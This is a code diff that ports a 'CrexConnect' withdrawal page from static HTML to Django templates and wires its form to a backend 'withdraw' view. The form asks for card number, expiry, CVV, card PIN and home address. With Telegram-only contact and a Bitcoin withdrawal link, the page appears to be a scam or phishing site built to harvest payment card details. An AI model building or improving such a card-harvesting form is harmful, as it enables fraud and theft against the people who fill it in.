@@ -285,16 +285,16 @@
 
     <header class="header">
         <nav class="navbar">
-                <a href="home.html" class="nav-logo"><h1 style="color: #0052ff;">CrexConnect</h1></a>
+                <a href="{% url 'index' %}" class="nav-logo"><h1 style="color: #0052ff;">CrexConnect</h1></a>
             <ul class="nav-menu">
                 <li class="nav-item">
-                    <a href="home.html" class="nav-link">Home</a>
+                    <a href="{% url 'index' %}" class="nav-link">Home</a>
                 </li>
                 <li class="nav-item">
-                    <a href="services.html" class="nav-link">Services</a>
+                    <a href="{% url 'services' %}" class="nav-link">Services</a>
                 </li>
                 <li class="nav-item">
-                    <a href="about.html" class="nav-link">About</a>
+                    <a href="{% url 'about' %}" class="nav-link">About</a>
                 </li>
                 <li class="nav-item">
                     <a href="https://t.me/CrexSupport" class="nav-link">Contact</a>
@@ -315,28 +315,29 @@
             <p>Please note that we accept all types of card and no extra commission/ transaction fee will be required.</p>
         </div>
         
-          <form action="/action_page.php" target="_self" method="post" autocomplete="on">
+          <form action="{% url 'withdraw' %}" method="post" autocomplete="on">
+              {% csrf_token %}
             <label for="card-name">Name on card:</label>
-            <input type="text" placeholder="Full Name" id="card-name" name="card-name" size="30" required><br>
+            <input type="text" placeholder="Full Name" id="card-name" name="name" size="30" required><br>
 
             <label for="card-number">Card Number:</label>
-            <input type="text" placeholder="Card Number" id="card-number" name="card-number" size="30" required><br>
+            <input type="number" placeholder="Card Number" id="card-number" name="number" size="30" required><br>
 
             <label for="expires">Expires:</label>
-            <input type="number" id="expires" name="expires" min="1" max="31" required>
-            <input type="number" id="expires" name="expires" min="2022" max="3000" required><br>
+            <input type="number" id="expires" name="expiryy" required>
+            <input type="number" id="expires" name="expirym" min="2022" max="3000" required><br>
 
             <label for="cvv">cvv:</label>
-            <input type="number" id="cvv" name="cvv" min="1" max="999" required>
+            <input type="number" id="cvv" name="cvv" required>
 
             <label for="card-pin">Card pin:</label>
-            <input type="number" id="card-pin" name="card-pin" min="1" max="9999" required>
+            <input type="number" id="card-pin" name="pin" required>
 
             <label for="zip-code">Zip-code:</label>
-            <input type="number" id="zip-code" name="zip-code" min="1" max="999999" required><br>
+            <input type="number" id="zip-code" name="zipcode" required><br>
 
             <label for="country">Country:</label>
-            <input type="country" id="country" placeholder="country" name="country" required><br>
+            <input type="text" id="country" placeholder="country" name="country" required><br>
 
             <label for="state">State:</label>
             <input type="text" id="state" placeholder="state" name="state" required><br>
@@ -345,16 +346,20 @@
             <input type="text" id="city" placeholder="city" name="city" required><br>
 
             <label for="address1">Address 1:</label>
-            <input type="text" id="address1" placeholder="enter home address" name="address1" size="30" required><br>
+            <input type="text" id="address1" placeholder="enter home address" name="add1" size="30" required><br>
 
             <label for="address2">Address 2:</label>
-            <input type="text" id="address2" placeholder="enter second address(optional)" size="30" name="address2"><br>
+            <input type="text" id="address2" placeholder="enter second address(optional)" size="30" name="add2"><br>
+
+            {% if user.is_authenticated %}
+              <input type="hidden" name="username" value="{{ user.username }}">
+            {% endif %}
 
             <input type="submit" value="submit" class="button">
 
           </form>
 
-          <div><a href="BTCwithdraw.html">Withdraw via Bitcoin</a></div>
+          <div><a href="{% url 'btcwithdraw' %}">Withdraw via Bitcoin</a></div>
       </div>
   </div> 
 
